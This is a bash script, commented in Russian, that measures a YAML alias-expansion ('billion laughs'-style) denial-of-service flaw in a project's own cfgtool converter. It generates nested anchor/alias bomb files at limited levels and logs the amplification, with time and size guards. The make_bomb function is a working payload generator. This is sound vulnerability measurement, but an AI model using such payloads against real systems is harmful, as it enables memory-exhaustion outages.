#!/usr/bin/env bash
# Демонстрация усиления при разборе YAML с псевдонимами (alias/anchor).
#
# Файл вида
#   l0: &l0 ["x", ... 9 элементов ...]
#   l1: &l1 [*l0, ... 9 ссылок ...]
#   ...
# при разборе разворачивается в 9^N значений, тогда как сам файл
# растёт линейно (около 46 байт на уровень).
#
# Скрипт намеренно ограничен малыми уровнями: цель — измерить
# коэффициент усиления, а не исчерпать память машины.
#   - уровни 2..6 (максимум 9^6 = 531 441 значение);
#   - на каждый запуск лимит времени;
#   - цикл прекращается, если результат превысил порог размера.
set -u
cd "$(dirname "$0")/.."

LABEL="${1:-$(git describe --tags --always --dirty 2>/dev/null || echo local)}"
OUT_DIR="reports/$LABEL"
REPORT="$OUT_DIR/dos-alias-bomb.txt"
MAX_LEVEL=6
TIME_LIMIT=30          # секунд на один запуск
SIZE_GUARD=$((64*1024*1024))   # 64 МиБ: порог прекращения цикла

mkdir -p "$OUT_DIR"
WORK="$(mktemp -d)"
trap 'rm -rf "$WORK"' EXIT

go build -o "$WORK/cfgtool" ./cmd/cfgtool || exit 1

# мягкое ограничение памяти для среды выполнения Go
export GOMEMLIMIT=1GiB

make_bomb() {
  local levels="$1" out="$2"
  {
    printf 'l0: &l0 ["x","x","x","x","x","x","x","x","x"]\n'
    local i j prev refs
    for ((i = 1; i <= levels; i++)); do
      prev=$((i - 1))
      refs=""
      for ((j = 1; j <= 9; j++)); do refs="$refs*l$prev,"; done
      printf 'l%d: &l%d [%s]\n' "$i" "$i" "${refs%,}"
    done
    printf 'root: *l%d\n' "$levels"
  } > "$out"
}

{
  echo "Демонстрация усиления при разборе YAML с псевдонимами"
  echo "Продукт: $(git describe --tags --always --dirty 2>/dev/null || echo local)"
  echo "Ограничения прогона: уровни 2..$MAX_LEVEL, лимит ${TIME_LIMIT}с, порог ${SIZE_GUARD} байт"
  echo
  printf '%-7s %-12s %-14s %-16s %-10s %s\n' \
    "уровни" "вход, Б" "значений" "результат, Б" "время, мс" "усиление"
  printf '%s\n' "---------------------------------------------------------------------------------"
} > "$REPORT"

for ((level = 2; level <= MAX_LEVEL; level++)); do
  bomb="$WORK/bomb$level.yaml"
  make_bomb "$level" "$bomb"
  in_size=$(wc -c < "$bomb")
  values=$((9 ** (level + 1)))

  start=$(date +%s%3N)
  timeout "$TIME_LIMIT" "$WORK/cfgtool" convert "$bomb" > "$WORK/out$level.json" 2> "$WORK/err$level.txt"
  rc=$?
  end=$(date +%s%3N)

  out_size=$(wc -c < "$WORK/out$level.json" 2>/dev/null || echo 0)
  elapsed=$((end - start))

  if [ "$rc" -eq 124 ]; then
    printf '%-7s %-12s %-14s %-16s %-10s %s\n' \
      "$level" "$in_size" "$values" "-" ">${TIME_LIMIT}000" "прервано по времени" >> "$REPORT"
    echo "уровень $level: прервано по лимиту времени" >&2
    break
  fi

  ratio=$((out_size / in_size))
  printf '%-7s %-12s %-14s %-16s %-10s %s\n' \
    "$level" "$in_size" "$values" "$out_size" "$elapsed" "x$ratio" >> "$REPORT"
  echo "уровень $level: вход ${in_size}B -> результат ${out_size}B за ${elapsed}ms (x$ratio)"

  if [ "$out_size" -gt "$SIZE_GUARD" ]; then
    echo "порог размера превышен, дальнейшие уровни не запускаются" >> "$REPORT"
    echo "порог размера превышен, останов" >&2
    break
  fi
done

{
  echo
  echo "Вывод: каждая добавленная строка увеличивает объём разбираемых данных"
  echo "примерно в 9 раз, а сам файл — примерно на 46 байт. Исходная версия"
  echo "продукта не ограничивает ни число раскрываемых псевдонимов, ни размер"
  echo "входных данных, поэтому рост ограничен только памятью машины."
  echo "Экстраполяция замеренного роста (в прогоне не выполнялась):"
  echo "  уровень  9 -> около 3.9e9 значений"
  echo "  уровень 10 -> около 3.5e10 значений"
} >> "$REPORT"

echo
cat "$REPORT"
